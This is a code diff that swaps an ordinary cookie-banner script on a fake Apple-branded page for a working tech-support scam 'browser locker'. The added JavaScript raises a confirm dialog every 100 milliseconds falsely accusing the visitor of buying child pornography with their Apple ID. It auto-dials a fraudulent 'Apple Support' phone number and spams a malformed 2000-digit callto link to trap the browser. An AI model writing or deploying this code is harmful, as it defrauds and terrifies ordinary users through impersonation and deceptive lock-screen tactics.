+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1-888-449-3823
+			 " property="telephone" />
+            </section>
+        </div>
+    </footer>
 
-      // Handle "Accept" button click
-      acceptCookiesButton.addEventListener('click', function() {
-        localStorage.setItem(cookieName, 'true');
-        cookieConsentBanner.classList.add('d-none');
-      });
 
-      // Simple smooth scroll for anchor links
-      document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-          anchor.addEventListener('click', function (e) {
-              e.preventDefault();
 
-              document.querySelector(this.getAttribute('href')).scrollIntoView({
-                  behavior: 'smooth'
-              });
-          });
-      });
-    });
-  </script>
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-888-449-3823');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-449-3823"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at CH!LD P0RN0GRÀPHY WEBSITE for $549.70 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-449-3823 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
 </body>
+
+
 </html>
